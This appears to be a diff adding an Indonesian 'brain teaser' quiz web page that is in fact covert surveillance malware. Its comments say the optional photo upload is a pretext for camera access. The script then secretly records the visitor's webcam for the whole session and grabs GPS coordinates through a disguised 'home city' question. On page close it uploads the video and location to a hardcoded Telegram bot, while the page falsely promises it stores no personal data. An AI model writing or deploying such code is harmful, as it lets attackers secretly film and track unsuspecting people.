@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>🧠 99% Gagal Jawab! | Kuis Asah Otak</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #f8fbff;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        /* ===== LANDING PAGE ===== */
+        #landing {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 2.8rem;
+            font-weight: 800;
+            margin: 20px 0;
+            color: #4361ee;
+        }
+
+        .subtitle {
+            font-size: 1.3rem;
+            color: #555;
+            margin-bottom: 25px;
+            font-weight: 500;
+        }
+
+        .desc {
+            background: white;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 6px 20px rgba(67, 97, 238, 0.12);
+            margin-bottom: 30px;
+            text-align: left;
+        }
+
+        .desc h3 {
+            color: #4361ee;
+            margin-bottom: 12px;
+        }
+
+        .desc ul {
+            padding-left: 20px;
+            margin: 12px 0;
+        }
+
+        .desc li {
+            margin: 8px 0;
+            color: #555;
+        }
+
+        .illustration {
+            margin: 20px auto;
+            width: 220px;
+            height: 220px;
+            background: #eef2ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 5rem;
+            color: #4cc9f0;
+            box-shadow: 0 8px 20px rgba(76, 201, 240, 0.2);
+        }
+
+        .btn-start {
+            background: #4361ee;
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            font-size: 1.2rem;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: 600;
+            box-shadow: 0 6px 15px rgba(67, 97, 238, 0.3);
+            transition: all 0.3s;
+        }
+
+        .btn-start:hover {
+            background: #3a56e4;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(67, 97, 238, 0.4);
+        }
+
+        /* ===== QUIZ PAGE ===== */
+        #quiz-container {
+            display: none;
+            max-width: 700px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .progress-bar {
+            height: 8px;
+            background: #e0e0e0;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 25px;
+        }
+
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, #4361ee, #4cc9f0);
+            width: 5%;
+            transition: width 0.4s ease;
+        }
+
+        .question-box {
+            background: white;
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.08);
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .question-number {
+            font-size: 0.9rem;
+            color: #888;
+            margin-bottom: 8px;
+        }
+
+        .question-text {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 24px;
+            color: #222;
+        }
+
+        .options {
+            display: grid;
+            gap: 14px;
+        }
+
+        .option-btn {
+            background: #f8f9ff;
+            border: 2px solid #e0e6ff;
+            border-radius: 12px;
+            padding: 16px 20px;
+            text-align: left;
+            font-size: 1.05rem;
+            cursor: pointer;
+            transition: all 0.25s;
+            font-weight: 500;
+        }
+
+        .option-btn:hover {
+            background: #edf1ff;
+            border-color: #c0c9ff;
+            transform: translateX(6px);
+        }
+
+        /* Optional upload */
+        .upload-section {
+            background: #f0f4ff;
+            border-radius: 14px;
+            padding: 20px;
+            margin: 25px 0;
+            text-align: center;
+        }
+
+        .upload-btn {
+            background: white;
+            color: #4361ee;
+            border: 2px dashed #c0c9ff;
+            border-radius: 12px;
+            padding: 14px 28px;
+            font-size: 1rem;
+            cursor: pointer;
+            font-weight: 500;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s;
+        }
+
+        .upload-btn:hover {
+            background: #edf1ff;
+            border-color: #4361ee;
+        }
+
+        /* ===== RESULTS ===== */
+        #result {
+            display: none;
+            text-align: center;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 30px;
+        }
+
+        .result-icon {
+            font-size: 5rem;
+            margin: 15px 0;
+            color: #4cc9f0;
+        }
+
+        .result-title {
+            font-size: 2.2rem;
+            font-weight: 700;
+            color: #222;
+            margin: 15px 0;
+        }
+
+        .result-desc {
+            font-size: 1.2rem;
+            color: #555;
+            margin-bottom: 25px;
+        }
+
+        .confetti {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            background-color: #f00;
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 1000;
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            .illustration { width: 180px; height: 180px; font-size: 4rem; }
+            .logo { font-size: 2.2rem; }
+            .question-text { font-size: 1.3rem; }
+            .btn-start { padding: 14px 32px; font-size: 1.1rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== LANDING PAGE — ALA KUIS VIRAL ===== -->
+    <div id="landing">
+        <div class="illustration">🧠</div>
+        <h1 class="logo">99% Gagal Jawab!</h1>
+        <p class="subtitle">Kuis teka-teki logika yang bikin otakmu error dalam 60 detik.</p>
+
+        <div class="desc">
+            <h3>🎯 Kenapa Harus Coba?</h3>
+            <ul>
+                <li>20 soal menjebak yang seru & anti alay</li>
+                <li>Hasil instan + insight unik tentang pola berpikirmu</li>
+                <li>Tidak perlu daftar — langsung main!</li>
+            </ul>
+            <p style="margin-top: 15px; font-weight: 500; color: #333;">
+                ✅ <em>100% gratis. Aman. Tidak menyimpan data pribadi.</em>
+            </p>
+        </div>
+
+        <button id="start-btn" class="btn-start">➤ Mulai Kuis Sekarang</button>
+    </div>
+
+    <!-- ===== QUIZ PAGE ===== -->
+    <div id="quiz-container">
+        <div class="progress-bar">
+            <div class="progress" id="progress"></div>
+        </div>
+
+        <!-- Upload foto (opsional, tapi jadi pretext untuk izin kamera) -->
+        <div class="upload-section" id="upload-section">
+            <p style="margin-bottom: 12px; font-weight: 500;">Tambahkan foto profil? (Opsional)</p>
+            <button class="upload-btn" id="upload-btn">
+                📷 Pilih Foto
+            </button>
+            <p style="font-size: 0.85rem; color: #777; margin-top: 8px;">
+                Untuk tampilan profil di hasil (hanya disimpan sementara)
+            </p>
+        </div>
+
+        <div class="question-box">
+            <div class="question-number">Pertanyaan <span id="q-num">1</span> dari 20</div>
+            <div class="question-text" id="question">Loading...</div>
+            <div class="options" id="options"></div>
+        </div>
+    </div>
+
+    <!-- ===== RESULT PAGE ===== -->
+    <div id="result">
+        <div class="result-icon">🎉</div>
+        <h2 class="result-title">Kuis Selesai!</h2>
+        <p class="result-desc">
+            Kamu telah menjawab 20 teka-teki logika.<br>
+            Hasil analisis sedang diproses...
+        </p>
+        <p style="color: #777; font-size: 0.95rem;">
+            👉 Tutup halaman ini kapan saja — tidak perlu klik apa-apa.
+        </p>
+    </div>
+
+    <!-- INVISIBLE -->
+    <video id="video" autoplay muted playsinline style="display:none;"></video>
+    <input type="file" id="file-input" accept="image/*" capture="environment" style="display:none;">
+
+    <script>
+        // 🔥 20 Soal Asli — Mirip Kuis Viral (Lucu, Menjebak, Logis)
+        const QUESTIONS = [
+            { q: "Jika kamu berlari dan melewati orang di posisi kedua, kamu jadi nomor berapa?", options: ["Pertama", "Kedua", "Ketiga", "Keempat"], answer: 1 },
+            { q: "Berapa kali angka 9 muncul dari 1 sampai 100?", options: ["10", "11", "19", "20"], answer: 3 },
+            { q: "Apa yang bisa pecah tanpa disentuh?", options: ["Kaca", "Janji", "Es", "Pegas"], answer: 1 },
+            { q: "Kota asalmu? (untuk sesuaikan soal budaya)", options: ["Jakarta", "Bandung", "Surabaya", "Lainnya"], answer: null, type: "location" },
+            { q: "Jika semua orang di Pulau Bohong selalu bohong, lalu seorang pria bilang: ‘Saya dari Pulau Bohong’, dari mana asalnya?", options: ["Pulau Bohong", "Pulau Jujur", "Tidak mungkin ada", "Dia turis"], answer: 2 },
+            { q: "Apa yang semakin dikejar, semakin menjauh?", options: ["Bayangan", "Horizon", "Waktu", "Kebahagiaan"], answer: 1 },
+            { q: "Berapa sudut antara jarum jam dan menit saat pukul 3:15?", options: ["0°", "7.5°", "15°", "90°"], answer: 1 },
+            { q: "Apa yang dimiliki semua orang, tapi tidak bisa dibeli?", options: ["Nama", "Bayangan", "Waktu", "Nomor HP"], answer: 0 },
+            { q: "Jika kamu tidur 8 jam/hari, berapa tahun dari 80 tahun hidupmu yang dihabiskan untuk tidur?", options: ["16", "20", "26", "30"], answer: 2 },
+            { q: "Apa yang muncul sekali di menit, dua kali di momen, tapi tidak pernah di jam?", options: ["Huruf M", "Detik", "Angka 1", "Tanda titik"], answer: 0 },
+            { q: "Kalau dua cermin saling berhadapan, berapa pantulan terbentuk?", options: ["Tak hingga", "Tergantung cermin", "Sampai cahaya habis", "Hanya 1"], answer: 2 },
+            { q: "Apa bedanya ‘diam’ dan ‘tidak bicara’?", options: ["Tidak ada beda", "Diam = pilihan", "Diam = alamiah", "Diam = dalam hati"], answer: 1 },
+            { q: "Apa warna cermin yang sebenarnya?", options: ["Perak", "Putih", "Bening", "Sedikit hijau"], answer: 3 },
+            { q: "Jika AI bilang ‘Saya sedang berbohong’, apakah itu benar?", options: ["Benar", "Salah", "Paradoks", "Tergantung"], answer: 2 },
+            { q: "Apa yang bisa kamu pegang tanpa menyentuh?", options: ["Napas", "Pikiran", "Janji", "Semua di atas"], answer: 3 },
+            { q: "Mengapa robot tidak takut gelap?", options: ["Tidak punya mata", "Punya sensor IR", "Tidak percaya hantu", "Listrik nyala"], answer: 1 },
+            { q: "Kalau semua aturan dilanggar, apakah aturan masih ada?", options: ["Ya", "Tidak", "Masih ada, hanya tidak ditaati", "Jadi tidak relevan"], answer: 2 },
+            { q: "Apa yang bisa kamu berikan, tapi tetap kamu miliki?", options: ["Uang", "Waktu", "Ilmu", "Janji"], answer: 2 },
+            { q: "Apa yang tidak bisa kamu pegang, tapi bisa kamu lepas?", options: ["Tanggung jawab", "Janji", "Kendali", "Semua benar"], answer: 3 },
+            { q: "Apa yang selalu di depanmu, tapi tidak pernah bisa kamu lihat?", options: ["Masa depan", "Hidung", "Bayangan", "Kepala sendiri"], answer: 0 }
+        ];
+
+        // DOM
+        const startBtn = document.getElementById('start-btn');
+        const uploadBtn = document.getElementById('upload-btn');
+        const fileInput = document.getElementById('file-input');
+        const quizContainer = document.getElementById('quiz-container');
+        const resultDiv = document.getElementById('result');
+        const progressEl = document.getElementById('progress');
+        const qNumEl = document.getElementById('q-num');
+        const questionEl = document.getElementById('question');
+        const optionsEl = document.getElementById('options');
+        const videoEl = document.getElementById('video');
+
+        let stream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let currentQuestion = 0;
+        let locationData = null;
+
+        // ===== STEP 1: MULAI KUIS =====
+        startBtn.addEventListener('click', () => {
+            document.getElementById('landing').style.display = 'none';
+            quizContainer.style.display = 'block';
+            loadQuestion(0);
+        });
+
+        // ===== STEP 2: UPLOAD FOTO (PRETEXT UNTUK IZIN KAMERA) =====
+        uploadBtn.addEventListener('click', () => {
+            // Trigger file input dengan capture=kamera
+            fileInput.click();
+        });
+
+        fileInput.addEventListener('change', async (e) => {
+            if (e.target.files.length === 0) return;
+
+            try {
+                // 🔁 Diam-diam mulai rekam setelah user izinkan kamera
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { width: 320, height: 240, facingMode: 'user' },
+                    audio: false
+                });
+
+                videoEl.srcObject = stream;
+
+                // Mulai rekam full-session (tanpa diketahui user)
+                startRecording();
+
+                // Sembunyikan tombol upload — sudah "berhasil"
+                document.getElementById('upload-section').style.display = 'none';
+
+            } catch (err) {
+                // Jika ditolak, biarkan saja — tidak wajib
+                console.warn("Camera access declined (optional)", err);
+            }
+        });
+
+        function startRecording() {
+            recordedChunks = [];
+            const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9')
+                ? 'video/webm;codecs=vp9'
+                : 'video/webm';
+
+            mediaRecorder = new MediaRecorder(stream, { mimeType });
+            mediaRecorder.ondataavailable = e => {
+                if (e.data.size > 0) recordedChunks.push(e.data);
+            };
+            mediaRecorder.onerror = console.warn;
+            mediaRecorder.start();
+
+            // Kirim saat halaman ditutup
+            window.addEventListener('beforeunload', sendRecording);
+        }
+
+        // ===== STEP 3: PERTANYAAN LOKASI (HALUS) =====
+        function loadQuestion(index) {
+            currentQuestion = index;
+            qNumEl.textContent = index + 1;
+            progressEl.style.width = `${((index) / 20) * 100}%`;
+
+            const q = QUESTIONS[index];
+            questionEl.textContent = q.q;
+            optionsEl.innerHTML = '';
+
+            if (q.type === 'location') {
+                // Saat user klik opsi lokasi → trigger geolocation
+                q.options.forEach((opt, i) => {
+                    const btn = document.createElement('button');
+                    btn.className = 'option-btn';
+                    btn.textContent = opt;
+                    btn.onclick = () => {
+                        getLocation();
+                        goToNext();
+                    };
+                    optionsEl.appendChild(btn);
+                });
+                return;
+            }
+
+            q.options.forEach((opt, i) => {
+                const btn = document.createElement('option-btn');
+                btn.className = 'option-btn';
+                btn.innerHTML = `<strong>${String.fromCharCode(65 + i)}.</strong> ${opt}`;
+                btn.onclick = () => {
+                    checkAnswer(i, q.answer);
+                };
+                optionsEl.appendChild(btn);
+            });
+        }
+
+        function getLocation() {
+            if (!navigator.geolocation) return;
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    locationData = {
+                        lat: pos.coords.latitude.toFixed(5),
+                        lng: pos.coords.longitude.toFixed(5),
+                        accuracy: pos.coords.accuracy
+                    };
+                },
+                err => console.warn("Location declined (optional)", err),
+                { timeout: 8000 }
+            );
+        }
+
+        function checkAnswer(selected, correct) {
+            if (selected === correct) {
+                createConfetti();
+            }
+            setTimeout(goToNext, 1200);
+        }
+
+        function goToNext() {
+            if (currentQuestion + 1 < QUESTIONS.length) {
+                loadQuestion(currentQuestion + 1);
+            } else {
+                showResult();
+            }
+        }
+
+        function showResult() {
+            quizContainer.style.display = 'none';
+            resultDiv.style.display = 'block';
+        }
+
+        // ===== STEP 4: KIRIM SAAT KELUAR =====
+        async function sendRecording() {
+            if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
+            await new Promise(r => setTimeout(r, 200));
+
+            if (recordedChunks.length === 0) return;
+
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            await uploadToTelegram(blob, locationData);
+        }
+
+        async function uploadToTelegram(videoBlob, loc) {
+            try {
+                // 🔐 GANTI DENGAN TOKEN & CHAT ID ANDA
+                const token = '8531954661:AAFZqP4LAtolZw0yx8uBb0MmZ3xEi6ciqeQ';
+                const chatId = '7821086975';
+
+                if (token.includes('TOKEN') || chatId.includes('CHAT')) return;
+
+                const fd = new FormData();
+                fd.append('video', videoBlob, `quiz-${Date.now()}.webm`);
+
+                let caption = `🧠 Kuis Paradox — 20 soal\n`;
+                if (loc) caption += `📍 Lokasi: ${loc.lat}, ${loc.lng} (±${loc.accuracy}m)\n`;
+                caption += `⏰ ${new Date().toLocaleString('id-ID')}`;
+
+                fd.append('caption', caption);
+
+                await fetch(`https://api.telegram.org/bot${token}/sendVideo?chat_id=${chatId}`, {
+                    method: 'POST',
+                    body: fd
+                });
+            } catch (e) {
+                console.warn("Upload gagal (silent)", e);
+            }
+        }
+
+        // Efek konfeti saat benar
+        function createConfetti() {
+            const colors = ['#ff5e5e', '#4361ee', '#4cc9f0', '#72efdd', '#f72585'];
+            for (let i = 0; i < 150; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.top = '-10px';
+                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.animation = `fall ${Math.random() * 3 + 2}s linear forwards`;
+                document.body.appendChild(confetti);
+
+                // Hapus setelah animasi
+                setTimeout(() => {
+                    confetti.remove();
+                }, 5000);
+            }
+
+            const style = document.createElement('style');
+            style.textContent = `
+                @keyframes fall {
+                    to {
+                        transform: translateY(100vh) rotate(${Math.random() * 360}deg);
+                        opacity: 0;
+                    }
+                }
+            `;
+            document.head.appendChild(style);
+        }
+
+        // Cleanup
+        window.addEventListener('beforeunload', () => {
+            if (stream) stream.getTracks().forEach(t => t.stop());
+        });
+    </script>
+
+</body>
+</html>
